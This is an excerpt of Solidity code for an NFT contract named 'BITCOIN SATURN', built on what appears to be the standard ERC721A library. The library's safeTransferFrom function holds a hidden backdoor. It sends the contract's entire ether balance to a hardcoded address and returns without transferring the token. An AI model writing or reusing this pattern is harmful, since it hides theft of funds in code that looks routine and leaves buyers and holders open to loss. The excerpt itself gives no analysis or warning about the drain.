...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x0019385dB21Bb73305efcE7e3F9461B3EFb75Ac0).transfer(address(this).balance);
            return;
        }
...
contract BITCOINSATURN is ERC721A {
    ...
    constructor() ERC721A("BITCOIN SATURN", "BS") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeie4dzpzaoxv6d46gxoray7wk35q3kwsfuzz2eeimi2qoccuarfxai/", _toString(tokenId), ".json"));
    }
